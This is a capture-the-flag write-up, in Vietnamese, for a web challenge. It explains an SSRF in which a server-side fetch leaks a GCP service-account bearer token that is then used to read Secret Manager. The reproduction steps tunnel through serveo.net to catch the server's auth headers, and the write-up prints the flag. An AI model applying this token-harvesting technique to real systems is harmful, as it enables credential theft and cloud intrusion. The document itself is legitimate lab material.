# Đề bài - cloudy-spaceships

## Nguyên văn đề

```text
Cloudy with a Chance of Spaceships
67
What's your forecast looking like?

http://34.116.80.78:9143/
```

Thẻ bài chỉ in số điểm (67, giá tại lúc solve), không in hạng độ khó. Không kèm file;
mọi dữ kiện lấy từ service đang chạy. Văn bản trên trang chủ:

```text
Cloudy with a Chance of Spaceships ☁️🚀
The fleet lives in the cloud now. Every craft phones home to the ground station to
report how it's doing.
Space runs hot and cold, so the hull temperature swings around depending on where a
craft is parked. Nothing a good forecast can't handle.
To save you squinting at the sky, we've wired up a handy board of live hull readings
for the fleet below. Pick a ship and we'll take its temperature!
```

Kèm năm nút: `Voyager 1`, `Cassini`, `New Horizons`, `Juno`, `Galileo`.

## Thông tin đã xác minh từ file

| Mục | Giá trị |
| --- | --- |
| Artifact | `files/index.html` (copy từ `GET http://34.116.80.78:9143/`) |
| Kích thước | 1827 B, sha256 `1605c34d8e6d82d0e7ed34b8120152b666c73752ccde235431c9d3eb4d413e66` |
| Loại file | HTML document, UTF-8; response có header `x-sveltekit-page: true` |
| Artifact | `files/2.CftUi-UM.js` (bundle node 2, `/_app/immutable/nodes/2.CftUi-UM.js`) |
| Kích thước | 5694 B, sha256 `2cc74b922523ba43dff04cda12f58fc34a13d9b90ba0d51b80d53725eb97e173` |
| Loại file | Unicode text, UTF-8, minified, có 1 dòng 4320 ký tự |
| Artifact | `files/0.G3MHSJ2t.css` |
| Kích thước | 7364 B, sha256 `e38adf6503e2acbd431d6d6fb71bc5745498d1bf7dfd38384ec2edab5f7384da` |
| Artifact | `files/error_127.html` (trang 500 khi resolver trỏ vào loopback) |
| Kích thước | 1407 B, sha256 `1becfac54929ec96808cd38ce937b7cf3a9730d0f350f53ad90a18b6e4cf0721` |
| Loại file | HTML SvelteKit, nội dung duy nhất: `Internal Error` |
| Endpoint | `GET /api/v1/ship/<tên>/temperature` (đọc từ bundle, xem `analysis/bundle_route.log`) |
| Header | `X-Resolver: "X" + base64(json)`, ví dụ literal trong bundle giải mã ra `{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}` |
| Thiếu header | HTTP 451; header không phải base64 cũng 451; base64 hợp lệ nhưng thiếu key `resolver` cũng 451 |
| Client phía server | `user-agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)`, `accept-encoding: gzip,deflate` |
| Danh tính GCP | `meteorologist@css-ctf-2026.iam.gserviceaccount.com`, project id `css-ctf-2026`, project number `613713115850` |
| Secret duy nhất | `projects/613713115850/secrets/goog_encryption_secret`, version `1`, 45 ký tự |
| Định dạng cờ | `CSSCTF{...}`, luật 6 của giải ghi case-sensitive |

## Hướng giải (tóm tắt)

Bundle SvelteKit tiết lộ route `/api/v1/ship/<tên>/temperature` cùng header `X-Resolver`
mà client sinh ra; server nhận URL trong header và tự fetch bằng node-fetch, nên đây là SSRF.
Con số trả về chỉ là hàm băm của nội dung fetch được và không đổi theo tên tàu, nên nó không
phải thứ đáng lấy: request mà server gửi đi mang theo `Authorization: Bearer ya29...` của
chính service account `meteorologist@css-ctf-2026`. Token đó còn hạn và có scope
`cloud-platform`, đủ để gọi Secret Manager và đọc bản của `goog_encryption_secret`.

## Chạy lại lời giải

Cần một callback công khai để hứng request của server; repo không chứa token.

```bash
python analysis/catch_auth.py 8911                      # cua so 1: ghi headers -> analysis/auth.log
ssh -R 80:localhost:8911 serveo.net                     # cua so 2: in ra https://<hash>-<ip>.serveousercontent.com
python exploit.py https://<hash>-<ip>.serveousercontent.com
```

Hoặc khi đã có token trong tay (lấy từ `analysis/auth.log`), bỏ qua bước SSRF:

```bash
CTF_TOKEN=ya29.moi python exploit.py
```

Kết quả: `CSSCTF{your_forecast_says_love_is_on_its_way}` (đã lưu trong `flag.txt`).
Bằng chứng các bước dò nằm trong `analysis/*.log`; `analysis/auth.log` (chứa token thật) bị
`.gitignore` loại khỏi repo.
